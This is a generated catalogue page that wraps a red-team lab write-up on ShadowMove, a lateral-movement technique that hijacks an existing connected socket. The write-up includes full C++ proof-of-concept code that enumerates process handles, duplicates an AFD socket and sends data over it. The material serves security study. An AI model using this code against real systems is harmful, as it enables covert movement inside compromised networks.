---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# ShadowMove: Lateral Movement by Duplicating Existing Sockets

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-lateral-movement-shadowmove-lateral-movement-by-stealing-duplicating-existing-connected-sockets` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/lateral-movement/shadowmove-lateral-movement-by-stealing-duplicating-existing-connected-sockets.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [ShadowMove: Lateral Movement by Duplicating Existing Sockets](../../topics/offensive-security/shadowmove-lateral-movement-by-duplicating-existing-sockets.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-lateral-movement-shadowmove-lateral-movement-by-stealing-duplicating-existing-connected-sockets |
| name | ShadowMove: Lateral Movement by Duplicating Existing Sockets |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/lateral-movement/shadowmove-lateral-movement-by-stealing-duplicating-existing-connected-sockets.md |

## Preserved Source Material

````yaml
_asset_filenames:
- image (748).png
- shadowmove-lateral-movement (1).gif
_body: "# ShadowMove: Lateral Movement by Duplicating Existing Sockets\n\n[ShadowMove](https://www.usenix.org/system/files/sec20summer\\\
  _niakanlahiji\\_prepub.pdf) (original paper by researchers Amirreza Niakanlahiji, Jinpeng Wei, Md Rabbi Alam, Qingyang Wang\
  \ and Bei-Tseng Chu, go check it for full details) is a lateral movement technique that works by stealing (duplicating)\
  \ an existing socket connected to a remote host, from a running process on a system an adversary has compromised.\n\nThis\
  \ is a quick lab to familiarize with the technique, while using the PoC by [Juan Manuel Fernández](https://www.twitter.com/@TheXC3LL)\
  \ which he provided in his [post](https://adepts.of0x.cc/shadowmove-hijack-socket/).\n\n## Overview\n\nThe below is a simplified\
  \ diagram showing how the technique works and how I tested it in my lab:\n\n![Source and Target hosts communicating using\
  \ ShadowMove technique](<../../.gitbook/assets/image (748).png>)\n\nLet's see what we have in the above diagram:\n\n1. On\
  \ the left, we have a compromised host (for example, we landed on this host by means of a successful phish) `192.168.1.117`\
  \ - this is the source host from which we want to move laterally to the target host `192.168.56.102`.\n2. On the right,\
  \ we have the target host `192.168.56.102,` which has a listening socket on TCP port 80, by means of running `nc -lvp 80`\n\
  3. Source host `192.168.1.117` has an established connection to the target host `192.168.56.102:80` via nc.exe.\n4. On the\
  \ source host, there's `ShadowMove.exe` process running - this is the process that executes the ShadowMove lateral movement\
  \ technique. Note that it does not establish any connections to remote hosts at any point in time during its lifetime -\
  \ this is the beauty of the technique.\n5. On the source host, `ShadowMove.exe` enumerates all handles `nc.exe` has opened\
  \ and looks for handles to `\\Device\\Afd`, which are used for network socket communications. Once found, the handle is\
  \ used to create a duplicate socket with `WSADuplicateSocketW` and `WSASocket` API calls. Once the shared socket is created,\
  \ `getpeername` is used to check if the destination address of the socket is that of target host's IP address, which in\
  \ our case is `192.168.56.102`.\n6. Once the shared socket is created based on the `\\Device\\Afd` handle pointing to the\
  \ target host, as found in step 5, `ShadowMove.exe` can now write to that socket with `send` and read from it with `recv`\
  \ API calls.\n\n{% hint style=\"warning\" %}\nIt's important to stress once more, the ShadowMove.exe **does not** **create\
  \ any TCP connections to the target host.** Instead, it reuses the existing connected socket to `192.168.56.102:80 ` between\
  \ the source and target host, that was established by the nc.exe process on the source system - and this is the key point\
  \ of this lateral movement technique.\n{% endhint %}\n\n## Code\n\nBelow is the code [written](https://adepts.of0x.cc/shadowmove-hijack-socket/)\
  \ by [Juan Manuel Fernández](https://www.twitter.com/@TheXC3LL) which I modified slightly, so that it would compile without\
  \ errors in my development environment with Visual Studio 2019:\n\n```cpp\n// PoC of ShadowMove Gateway by Juan Manuel Fernández\
  \ (@TheXC3LL) \n\n#define _WINSOCK_DEPRECATED_NO_WARNINGS\n#include <winsock2.h>\n#include <Windows.h>\n#include <stdio.h>\n\
  \n#pragma comment(lib,\"WS2_32\")\n\n// Most of the code is adapted from https://github.com/Zer0Mem0ry/WindowsNT-Handle-Scanner/blob/master/FindHandles/main.cpp\n\
  #define STATUS_INFO_LENGTH_MISMATCH 0xc0000004\n#define SystemHandleInformation 16\n#define ObjectNameInformation 1\n\n\
  typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(\n\tULONG SystemInformationClass,\n\tPVOID SystemInformation,\n\tULONG\
  \ SystemInformationLength,\n\tPULONG ReturnLength\n\t);\ntypedef NTSTATUS(NTAPI* _NtDuplicateObject)(\n\tHANDLE SourceProcessHandle,\n\
  \tHANDLE SourceHandle,\n\tHANDLE TargetProcessHandle,\n\tPHANDLE TargetHandle,\n\tACCESS_MASK DesiredAccess,\n\tULONG Attributes,\n\
  \tULONG Options\n\t);\ntypedef NTSTATUS(NTAPI* _NtQueryObject)(\n\tHANDLE ObjectHandle,\n\tULONG ObjectInformationClass,\n\
  \tPVOID ObjectInformation,\n\tULONG ObjectInformationLength,\n\tPULONG ReturnLength\n\t);\n\ntypedef struct _SYSTEM_HANDLE\n\
  {\n\tULONG ProcessId;\n\tBYTE ObjectTypeNumber;\n\tBYTE Flags;\n\tUSHORT Handle;\n\tPVOID Object;\n\tACCESS_MASK GrantedAccess;\n\
  } SYSTEM_HANDLE, * PSYSTEM_HANDLE;\n\ntypedef struct _SYSTEM_HANDLE_INFORMATION\n{\n\tULONG HandleCount;\n\tSYSTEM_HANDLE\
  \ Handles[1];\n} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;\n\ntypedef struct _UNICODE_STRING\n{\n\tUSHORT\
  \ Length;\n\tUSHORT MaximumLength;\n\tPWSTR Buffer;\n} UNICODE_STRING, * PUNICODE_STRING;\n\n\ntypedef enum _POOL_TYPE\n\
  {\n\tNonPagedPool,\n\tPagedPool,\n\tNonPagedPoolMustSucceed,\n\tDontUseThisType,\n\tNonPagedPoolCacheAligned,\n\tPagedPoolCacheAligned,\n\
  \tNonPagedPoolCacheAlignedMustS\n} POOL_TYPE, * PPOOL_TYPE;\n\ntypedef struct _OBJECT_NAME_INFORMATION\n{\n\tUNICODE_STRING\
  \ Name;\n} OBJECT_NAME_INFORMATION, * POBJECT_NAME_INFORMATION;\n\nPVOID GetLibraryProcAddress(const char *LibraryName,\
  \ const char *ProcName)\n{\n\treturn GetProcAddress(GetModuleHandleA(LibraryName), ProcName);\n}\n\nSOCKET findTargetSocket(DWORD\
  \ dwProcessId, LPSTR dstIP) {\n\tHANDLE hProc;\n\tPSYSTEM_HANDLE_INFORMATION handleInfo;\n\tDWORD handleInfoSize = 0x10000;\n\
  \tNTSTATUS status;\n\tDWORD returnLength;\n\tWSAPROTOCOL_INFOW wsaProtocolInfo = { 0 };\n\tSOCKET targetSocket;\n\n\t//\
  \ Open target process with PROCESS_DUP_HANDLE rights\n\thProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, dwProcessId);\n\t\
  if (!hProc) {\n\t\tprintf(\"[!] Error: could not open the process!\\n\");\n\t\texit(-1);\n\t}\n\tprintf(\"[+] Handle to\
  \ process obtained!\\n\");\n\n\t// Find the functions\n\t_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetLibraryProcAddress(\"\
  ntdll.dll\", \"NtQuerySystemInformation\");\n\t_NtDuplicateObject NtDuplicateObject = (_NtDuplicateObject)GetLibraryProcAddress(\"\
  ntdll.dll\", \"NtDuplicateObject\");\n\t_NtQueryObject NtQueryObject = (_NtQueryObject)GetLibraryProcAddress(\"ntdll.dll\"\
  , \"NtQueryObject\");\n\n\t// Retrieve handles from the target process\n\thandleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);\n\
  \twhile ((status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, handleInfoSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH)\n\
  \t\thandleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);\n\n\tprintf(\"[+] Found [%d] handles\
  \ in PID %d\\n============================\\n\", handleInfo->HandleCount, dwProcessId);\n\n\t// Iterate \n\tfor (DWORD i\
  \ = 0; i < handleInfo->HandleCount; i++) {\n\n\t\t// Check if it is the desired type of handle\n\t\tif (handleInfo->Handles[i].ObjectTypeNumber\
  \ == 0x24) {\n\n\t\t\tSYSTEM_HANDLE handle = handleInfo->Handles[i];\n\t\t\tHANDLE dupHandle = NULL;\n\t\t\tPOBJECT_NAME_INFORMATION\
  \ objectNameInfo;\n\n\t\t\t// Duplicate handle\n\t\t\tNtDuplicateObject(hProc, (HANDLE)handle.Handle, GetCurrentProcess(),\
  \ &dupHandle, PROCESS_ALL_ACCESS, FALSE, DUPLICATE_SAME_ACCESS);\n\t\t\tobjectNameInfo = (POBJECT_NAME_INFORMATION)malloc(0x1000);\n\
  \n\t\t\t// Get handle info\n\t\t\tNtQueryObject(dupHandle, ObjectNameInformation, objectNameInfo, 0x1000, &returnLength);\n\
  \n\t\t\t// Narow the search checking if the name length is correct (len(\\Device\\Afd) == 11 * 2)\n\t\t\tif (objectNameInfo->Name.Length\
  \ == 22) {\n\t\t\t\tprintf(\"[-] Testing %d of %d\\n\", i, handleInfo->HandleCount);\n\n\t\t\t\t// Check if it ends in \"\
  Afd\"\n\t\t\t\tLPWSTR needle = (LPWSTR)malloc(8);\n\t\t\t\tmemcpy(needle, objectNameInfo->Name.Buffer + 8, 6);\n\t\t\t\t\
  if (needle[0] == 'A' && needle[1] == 'f' && needle[2] == 'd') {\n\n\t\t\t\t\t// We got a candidate\n\t\t\t\t\tprintf(\"\\\
  t[*] \\\\Device\\\\Afd found at %d!\\n\", i);\n\n\t\t\t\t\t// Try to duplicate the socket\n\t\t\t\t\tstatus = WSADuplicateSocketW((SOCKET)dupHandle,\
  \ GetCurrentProcessId(), &wsaProtocolInfo);\n\t\t\t\t\tif (status != 0) {\n\t\t\t\t\t\tprintf(\"\\t\\t[X] Error duplicating\
  \ socket!\\n\");\n\t\t\t\t\t\tfree(needle);\n\t\t\t\t\t\tfree(objectNameInfo);\n\t\t\t\t\t\tCloseHandle(dupHandle);\n\t\t\
  \t\t\t\tcontinue;\n\t\t\t\t\t}\n\n\t\t\t\t\t// We got it?\n\t\t\t\t\ttargetSocket = WSASocket(wsaProtocolInfo.iAddressFamily,\
  \ wsaProtocolInfo.iSocketType, wsaProtocolInfo.iProtocol, &wsaProtocolInfo, 0, WSA_FLAG_OVERLAPPED);\n\t\t\t\t\tif (targetSocket\
  \ != INVALID_SOCKET) {\n\t\t\t\t\t\tstruct sockaddr_in sockaddr;\n\t\t\t\t\t\tDWORD len;\n\t\t\t\t\t\tlen = sizeof(SOCKADDR_IN);\n\
  \n\t\t\t\t\t\t// It this the socket?\n\t\t\t\t\t\tif (getpeername(targetSocket, (SOCKADDR*)&sockaddr, (int*)&len) == 0)\
  \ {\n\t\t\t\t\t\t\tif (strcmp(inet_ntoa(sockaddr.sin_addr), dstIP) == 0) {\n\t\t\t\t\t\t\t\tprintf(\"\\t[*] Duplicated socket\
  \ (%s)\\n\", inet_ntoa(sockaddr.sin_addr));\n\t\t\t\t\t\t\t\tfree(needle);\n\t\t\t\t\t\t\t\tfree(objectNameInfo);\n\t\t\t\
  \t\t\t\t\treturn targetSocket;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\n\t\t\t\t\t}\n\n\t\t\t\t\tfree(needle);\n\t\t\t\t}\n\n\t\
  \t\t}\n\t\t\tfree(objectNameInfo);\n\n\t\t}\n\t}\n\n\treturn 0;\n}\n\n\nint main(int argc, char** argv) {\n\tWORD wVersionRequested;\n\
  \tWSADATA wsaData;\n\tDWORD dwProcessId;\n\tLPSTR dstIP = NULL;\n\tSOCKET targetSocket;\n\tchar buff[255] = { 0 };\n\n\t\
  printf(\"\\t\\t\\t-=[ ShadowMove Gateway PoC ]=-\\n\\n\");\n\n\t// smgateway.exe [PID] [IP dst]\n\t/* It's just a PoC, we\
  \ do not validate the args. But at least check if number of args is right X) */\n\tif (argc != 3) {\n\t\tprintf(\"[!] Error:\
  \ syntax is %s [PID] [IP dst]\\n\", argv[0]);\n\t\texit(-1);\n\t}\n\tdwProcessId = strtoul(argv[1], NULL, 10);\n\tdstIP\
  \ = (LPSTR)malloc(strlen(argv[2]) * (char)+1);\n\tmemcpy(dstIP, argv[2], strlen(dstIP));\n\n\n\t// Classic\n\twVersionRequested\
  \ = MAKEWORD(2, 2);\n\tWSAStartup(wVersionRequested, &wsaData);\n\n\ttargetSocket = findTargetSocket(dwProcessId, dstIP);\n\
  \tsend(targetSocket, \"hello from shadowmove and reused socket!\\n\", strlen(\"hello from shadowmove and reused socket!\\\
  n\"), 0);\n\trecv(targetSocket, buff, 255, 0);\n\tprintf(\"\\n[*] Message from target to shadowmove:\\n\\n %s\\n\", buff);\n\
  \treturn 0;\n}\n```\n\n## Demo\n\nOnce we have compiled the above code, we can test the technique as it was described earlier\
  \ in our [diagram](shadowmove-lateral-movement-by-stealing-duplicating-existing-connected-sockets.md#overview). Below highlighted\
  \ are key aspects of the demo:\n\n* In the top right corner, there's a target system `192.168.56.102` with `nc` listening\
  \ on port `80`.\n* In the top left corner, there's a compromised (source) system and `nc.exe` establishing a connection\
  \ to target host `192.168.56.102:80`.\n* In the bottom left corner, there's `ShadowMove.exe` running on the source system,\
  \ which enumerates handles of the `nc.exe` running on the source system, finds a socket that is connected to `192.168.56.102:80`\
  \ (target system), duplicates it and writes `hello from shadowmove and reused socket!` to it, which is then received on\
  \ the target system (top right).&#x20;\n* Target system (top right) writes back to the same socket `hello from target to\
  \ shadowmove`, which is received by `shadowmove.exe` on the source system (bottom left).\n* In the bottom right, we see\
  \ a `ProcessHacker` that shows that at no point in time `shadowmove.exe` establishes no TCP connections.\n\n![Demo: ShadowMove\
  \ Lateral Movement in Action](<../../.gitbook/assets/shadowmove-lateral-movement (1).gif>)\n\n## References\n\n[https://www.usenix.org/system/files/sec20summer\\\
  _niakanlahiji\\_prepub.pdf](https://www.usenix.org/system/files/sec20summer\\_niakanlahiji\\_prepub.pdf)\n\n{% embed url=\"\
  https://adepts.of0x.cc/shadowmove-hijack-socket/\" %}"
_relative_path: offensive-security/lateral-movement/shadowmove-lateral-movement-by-stealing-duplicating-existing-connected-sockets.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/lateral-movement/shadowmove-lateral-movement-by-stealing-duplicating-existing-connected-sockets.md
````
